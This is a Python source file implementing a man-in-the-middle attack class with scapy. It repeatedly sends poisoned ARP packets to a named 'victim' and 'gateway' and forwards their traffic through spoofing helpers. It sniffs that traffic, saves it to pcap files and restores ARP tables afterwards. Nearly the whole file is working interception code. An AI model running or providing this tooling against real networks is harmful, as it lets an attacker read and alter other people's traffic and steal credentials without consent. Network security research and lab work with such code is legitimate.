__author__ = 'Nicholas Rodofile'
from Node import *
from portScan import *
from scapy.all import *
from interfaces import *
from parse_config import *
from Spoof import *
from threading import Thread
from time import sleep
from datetime import datetime


class MITM(object):

    """ Error Message function"""
    def error(self, msg="Error! ", summary=""):
        print '\033[91m' + msg + '\033[0m' + summary

    """ Warning Message function"""
    def warning(self, msg="Warning! ", summary=""):
        print '\033[33m' + msg + '\033[0m' + summary

    def show_verbose(self, str=None, function=None):
        if self.verbose:
            if str is not None:
                print str
            if function is not None:
                function()

    def __init__(self, victim=None, gateway=None, verbose=1,
                 pkt_count=1, interface_selected=None):
        self.victim = victim
        self.gateway = gateway
        self.pkt_count = pkt_count
        self.verbose = verbose
        self.interface_selected = interface_selected
        self.interfaces = all_interfaces()
        if self.interface_selected is None:
            self.warning("Warning MITM ", "Interface was not selected")
            self.interface_selected = select_interface()
        self.interface = self.interfaces[self.interface_selected]
        self.attacking = False
        self.attacker = Node(
            name="attacker",
            ip_address=self.interface["ipv4"],
            mac_address=self.interface["mac"],
            sequence=0,
            acknowledgement=0
        )
        self.gatewayARP = None
        self.victimARP = None
        self.arp_poision_config()
        self.show_verbose(function=self.attacker.show)
        self.spoof_gateway = None
        self.spoof_victim = None
        self.pkt_counter = 0
        self.sniffed = None

    def arp_poision_config(self):
        if self.victim is not None and self.gateway is not None:
            self.gatewayARP = self.gateway.poisoned_arp(self.victim, self.attacker)
            self.victimARP = self.victim.poisoned_arp(self.gateway, self.attacker)
            #self.show_verbose(function=self.gateway.show_all)
            #self.show_verbose(function=self.victim.show_all)

        else:
            self.warning("Warning MITM ", "Nodes Not Set!")

    def arp_poison(self):
        send(self.gatewayARP, verbose=0)
        send(self.victimARP, verbose=0)
        if self.verbose:
            print "ARP Poisoning"

    def arp_repair(self):
        if self.victim is None or self.gateway is None:
            print self.error("ARP Repair Error! : ", "Nodes Not Configured!")
            self.attacking = False
            return

        self.victim.repair_arp(self.gateway)
        self.gateway.repair_arp(self.victim)

    def arp_poisoning(self):
        if self.victim is None or self.gateway is None:
            print self.error("ARP Poisoning Error! : ", "Nodes Not Configured!")
            self.attacking = False
            return

        if self.gatewayARP is None or self.victimARP is None:
            self.warning("ARP Poisoning Warning! : ", "ARP packets being configured")
            self.arp_poision_config()

        while self.attacking:
            self.arp_poison()
            sleep(1)
        self.arp_repair()

    def init_spoofing(self):
        self.gateway.spoofer = Spoof(source=self.gateway, destination=self.victim, attacker=self.attacker,
                                     verbose=self.verbose, interface=self.interface_selected)
        self.victim.spoofer = Spoof(source=self.victim, destination=self.gateway, attacker=self.attacker,
                                    verbose=self.verbose, interface=self.interface_selected)

    def forward_packet(self, pkt):
        if pkt.haslayer(Ether):
            if pkt[Ether].dst == self.attacker.mac_address:
                if pkt[Ether].src == self.gateway.mac_address:
                    self.victim.spoof(pkt, self.attacker)

                elif pkt[Ether].src == self.victim.mac_address:
                    self.gateway.spoof(pkt, self.attacker)

                else:
                    self.error("Forward Error!: ", pkt.summary())
                    return

    def save_capture(self, sniffed, name=""):
        time_now = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = "mitm/mitm" + name + time_now + ".pcap"
        print "saving to", filename
        open(filename, 'w')
        wrpcap(filename, sniffed)
        return filename

    def get_sniffing_filter(self):
        if self.gateway is not None and self.victim is not None:
            return "(ether src %s) or (ether src %s)" % (self.victim.mac_address, self.gateway.mac_address)

        else:
            self.error("Filter Error! : ", "No Nodes to Sniff!")
            self.attacking = False
            return ""

    def start(self):
        pcap_file = ""
        self.attacking = True
        self.init_spoofing()
        filter_str = self.get_sniffing_filter()
        arp_poisoning_thread = Thread(target=self.arp_poisoning)
        arp_poisoning_thread.start()
        if self.attacking:
            self.show_verbose(str="Filter: " + filter_str)
            self.show_verbose(str="Starting MITM attack")
            self.sniffed = sniff(prn=self.forward_packet, filter=filter_str, count=int(self.pkt_count), timeout=60)
            pcap_file = self.save_capture(self.sniffed)
            self.show_verbose(str="Finished MITM attack")
        self.attacking = False
        arp_poisoning_thread.join()
        return pcap_file


def MITM_conf(interface='eth0', verbose=1, pkt_count=30, port="80"):
    gateway, victim = config_nodes(interface=interface, port=port)
    return MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
